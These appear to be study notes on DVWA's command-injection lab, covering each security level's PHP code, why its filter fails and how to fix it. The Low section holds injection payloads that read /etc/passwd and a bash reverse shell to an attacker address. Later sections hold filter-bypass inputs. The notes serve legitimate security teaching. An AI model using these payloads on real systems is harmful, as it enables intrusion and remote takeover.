# 02 — Command Injection

## What the feature does
A "ping an IP address" tool that takes user input and shells out to the OS `ping` command, returning the output.

---

## LOW

```php
$target = $_REQUEST[ 'ip' ];
$cmd = shell_exec( 'ping  -c 4 ' . $target );
```

**Exploitation:** No input validation at all — user input is concatenated straight into a shell command.

```
127.0.0.1 && whoami
127.0.0.1; id
127.0.0.1 | cat /etc/passwd
127.0.0.1 || uname -a
```

Reverse shell (Kali listener):
```bash
# Attacker terminal
nc -lvnp 4444
```
```
# DVWA "ip" field
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
```

**Why it works:** `shell_exec` invokes `/bin/sh -c "<string>"`, and shell metacharacters (`;`, `&&`, `||`, `|`, backticks, `$()`) are all interpreted by the shell, not the `ping` binary. Any string after a separator is executed as an independent command.

---

## MEDIUM

```php
$substitutions = [ '&&' => '', ';' => '' ];
$target = str_replace( array_keys($substitutions), $substitutions, $target );
```

**Why it's still bypassable:** This is a classic **blocklist**, and blocklists are almost always incomplete. It blocks `&&` and `;` but not:
- Single `&` (background execution)
- `|` (pipe)
- `||`
- Backticks `` ` `` or `$()`
- Newlines

```
127.0.0.1 | whoami
127.0.0.1 || whoami
127.0.0.1 & whoami
```

Also vulnerable to **filter bypass by re-injection**: if the filter runs once and non-recursively, an attacker can craft input where removing the blocked substring *creates* a new blocked substring, e.g. `;;` → strip one layer conceptually (this specific DVWA filter does simple `str_replace` which handles that case, but it illustrates the general class of bypass to always check for).

**Root issue:** Denylisting specific strings instead of only allowing known-good input (allowlisting) or avoiding shell invocation entirely.

---

## HIGH

```php
$substitutions = [
  '&' => '', ';' => '', '| ' => '', '-' => '', '$' => '',
  '(' => '', ')' => '', '`' => '', '||' => '',
];
$target = str_replace( array_keys($substitutions), $substitutions, $target );
```

**Why it's still bypassable:** Notice the filter blocks `'| '` (pipe **followed by a space**) but not a bare `|` with no trailing space:

```
127.0.0.1|whoami
127.0.0.1%0a whoami   (URL-encoded newline, if reflected raw before filtering)
```

This is the canonical lesson of command-injection filters: **any denylist of characters/substrings is a game of whack-a-mole**. High-level filtering is much better than Low/Medium, but a single missed edge case (spacing, encoding, alternate metacharacters) reopens full RCE.

**Root issue:** Still shelling out to a system command with string concatenation; still denylist-based, not allowlist-based, and not using safe API calls.

---

## IMPOSSIBLE

```php
$target = $_REQUEST[ 'ip' ];
$target = stripslashes( $target );
$octet = explode( ".", $target );
if ( count( $octet ) == 4 && is_numeric($octet[0]) && is_numeric($octet[1])
     && is_numeric($octet[2]) && is_numeric($octet[3])
     && $octet[0] <= 255 && $octet[1] <= 255 && $octet[2] <= 255 && $octet[3] <= 255 ) {
    $cmd = shell_exec( 'ping  -c 4 ' . $target );
} else {
    // reject
}
```

**Why this is actually secure:** This is **allowlist validation**, not denylisting. The input is only accepted if it strictly matches the shape of an IPv4 address (four numeric octets, 0–255). There is no character sequence that both (a) passes this structural check and (b) contains shell metacharacters, because shell metacharacters aren't numeric and the `explode('.')` count check forces exactly the IPv4 shape. This closes the entire injection class rather than blocking known-bad payloads.

*(Best practice beyond DVWA: avoid `shell_exec`/string concatenation entirely — use a language binding like PHP's `escapeshellarg()` combined with `proc_open`/`exec` using an argument array, or better, a native ICMP library instead of shelling out at all.)*

---

## Root Cause Summary
> Never build shell commands via string concatenation with user input. Validate input structurally against an allowlist (what it *should* look like), not by blocking characters you *think* are dangerous.

## Real-World Parallels
- CVE-2021-22205 (GitLab RCE via ExifTool metadata command injection)
- Router/IoT firmware "ping/traceroute diagnostic" web UIs are a recurring real-world command-injection source (Netgear, TP-Link CVEs)
- OWASP Top 10: **A03:2021 – Injection**

## Mitigation Checklist
- [ ] Avoid shelling out; use native language APIs/libraries where possible
- [ ] If shelling out is unavoidable, use argument arrays (`execve`-style), never string concatenation
- [ ] Allowlist input format (regex/structural validation), don't denylist characters
- [ ] Run the process with least privilege (no root, restricted syscall/network access via seccomp/AppArmor)
- [ ] Escape with language-provided functions (`escapeshellarg`) as defense in depth, never as the *only* control
